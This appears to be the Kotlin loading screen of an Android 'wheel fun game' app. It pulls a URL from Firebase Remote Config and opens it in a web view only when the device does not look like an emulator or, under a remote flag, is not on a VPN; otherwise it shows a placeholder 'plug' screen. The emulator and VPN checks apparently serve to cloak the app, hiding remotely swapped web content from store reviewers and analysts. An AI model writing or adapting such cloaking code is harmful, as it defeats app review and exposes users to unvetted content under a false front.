package wheel.`fun`.game

import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.view.Window
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import wheel.`fun`.game.databinding.ActivityLoadingBinding
import java.io.File
import java.util.Locale


class LoadingActivity: AppCompatActivity() {
    private val FILE_NAME = "file_url"
    private lateinit var binding: ActivityLoadingBinding
    private lateinit var webIntent: Intent
    private lateinit var plugIntent: Intent


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        binding = ActivityLoadingBinding.inflate(layoutInflater)

        supportRequestWindowFeature(Window.FEATURE_NO_TITLE)
        setContentView(binding.root)

        webIntent = Intent(binding.root.context, WebActivity::class.java)
        plugIntent = Intent(binding.root.context, PlugActivity::class.java)

        startAct()
    }

    private fun checkIsEmu(): Boolean {
//        if (BuildConfig.DEBUG) return false
        val phoneModel = Build.MODEL
        val buildProduct = Build.PRODUCT
        val buildHardware = Build.HARDWARE
        var result = (Build.FINGERPRINT.startsWith("generic")
                || phoneModel.contains("google_sdk")
                || phoneModel.lowercase(Locale.getDefault()).contains("droid4x")
                || phoneModel.contains("Emulator")
                || phoneModel.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || buildHardware == "goldfish"
                || Build.BRAND.contains("google")
                || buildHardware == "vbox86"
                || buildProduct == "sdk"
                || buildProduct == "google_sdk"
                || buildProduct == "sdk_x86"
                || buildProduct == "vbox86p"
                || Build.BOARD.lowercase(Locale.getDefault()).contains("nox")
                || Build.BOOTLOADER.lowercase(Locale.getDefault()).contains("nox")
                || buildHardware.lowercase(Locale.getDefault()).contains("nox")
                || buildProduct.lowercase(Locale.getDefault()).contains("nox"))
        if (result) return true
        result = result or (Build.BRAND.startsWith("generic") &&
                Build.DEVICE.startsWith("generic"))
        if (result) return true
        result = result or ("google_sdk" == buildProduct)
        return result
    }

    private fun haveLink(): Boolean =
        File(applicationContext.filesDir, FILE_NAME)
            .exists()

    private fun textLink(): String =
        File(applicationContext.filesDir, FILE_NAME)
            .bufferedReader()
            .use { it.readText(); }

    private fun checkForInternet(context: Context): Boolean {
        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = connectivityManager.activeNetwork ?: return false
            val activeNetwork = connectivityManager.getNetworkCapabilities(network) ?: return false
            return when {
                activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> true
                activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> true
                else -> false
            }
        } else {
            @Suppress("DEPRECATION") val networkInfo =
                connectivityManager.activeNetworkInfo ?: return false
            @Suppress("DEPRECATION")
            return networkInfo.isConnected
        }
    }

    private fun saveLink(url: String) {
        applicationContext.openFileOutput(
            FILE_NAME, Context.MODE_PRIVATE
        ).use {
            it.write(url.toByteArray())
        }
    }
    fun vpnActive(context: Context): Boolean {
        //this method doesn't work below API 21
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return false
        var vpnInUse = false
        val connectivityManager =
            context.getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val activeNetwork = connectivityManager.activeNetwork
            val caps = connectivityManager.getNetworkCapabilities(activeNetwork)
            return caps!!.hasTransport(NetworkCapabilities.TRANSPORT_VPN)
        }
        val networks = connectivityManager.allNetworks
        for (i in networks.indices) {
            val caps = connectivityManager.getNetworkCapabilities(networks[i])
            if (caps!!.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
                vpnInUse = true
                break
            }
        }
        return vpnInUse
    }


    private fun startAct() {
        if (haveLink()) {
            if (checkForInternet(binding.root.context)) {
                startActivity(webIntent.putExtra("url", textLink()))
            } else {
                startActivity(Intent(binding.root.context, NeedInternetActivity::class.java))
            }
        } else {
            firebase()
        }
    }

    private fun firebase() {
        val remoteConfig = FirebaseRemoteConfig.getInstance()
        val default = mapOf(
            "url" to ""
        )
        val configSettings: FirebaseRemoteConfigSettings = FirebaseRemoteConfigSettings.Builder()
            .setMinimumFetchIntervalInSeconds(10)
            .build()
        remoteConfig.setDefaultsAsync(default)
        remoteConfig.setConfigSettingsAsync(configSettings)
        remoteConfig.fetchAndActivate().addOnCompleteListener { task ->
            if (task.isSuccessful) {
                val ope: String = remoteConfig.getString("url")
                val to: Boolean = remoteConfig.getBoolean("to")
                if (to) {
                    if (ope.isEmpty() || checkIsEmu() || vpnActive(applicationContext)) {
                        startActivity(Intent(this, PlugActivity::class.java))
                    } else {
                        saveLink(ope)
                        startActivity(webIntent.putExtra("url", ope))
                    }
                } else {
                    if (ope.isEmpty() || checkIsEmu()) {
                        startActivity(Intent(this, PlugActivity::class.java))
                    } else {
                        saveLink(ope)
                        startActivity(webIntent.putExtra("url", ope))
                    }
                }
            }
        }
    }
}